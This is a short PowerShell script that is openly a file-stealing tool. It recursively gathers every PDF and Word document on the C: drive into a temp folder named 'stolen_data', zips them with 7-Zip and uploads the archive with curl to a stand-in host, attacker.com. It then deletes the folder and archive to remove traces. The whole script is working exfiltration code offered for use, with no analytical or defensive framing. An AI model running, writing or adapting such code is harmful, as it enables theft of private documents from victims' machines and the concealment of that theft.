# Define the search pattern
$searchPath = "C:\"  # Change this if needed

# Find all .pdf and .docx files
$targetFiles = Get-ChildItem -Path $searchPath -Recurse -File | Where-Object { $_.Extension -eq ".pdf" -or $_.Extension -eq ".docx" }

# Check if any files were found
if ($targetFiles.Count -eq 0) {
    Write-Host "No matching files found."
    exit 1
}

# Define the temporary folder to store found files
$tmpDir = "$env:TEMP\stolen_data"
New-Item -ItemType Directory -Path $tmpDir -Force

# Copy found files to the temporary directory
foreach ($file in $targetFiles) {
    Copy-Item -Path $file.FullName -Destination $tmpDir -Force
}

# Archive the collected files (using 7z, as it's commonly installed on Windows)
$archiveName = "$env:TEMP\secret_data.zip"
$7zPath = "C:\Program Files\7-Zip\7z.exe"  # Ensure 7-Zip is installed and this path is correct
& $7zPath a $archiveName "$tmpDir\*"

# Upload the archive using curl (ensure curl is installed or use Windows' native curl if available)
curl -T $archiveName http://attacker.com/upload

# Clean up
Remove-Item -Path $tmpDir -Recurse -Force
Remove-Item -Path $archiveName -Force

Write-Host "Operation completed."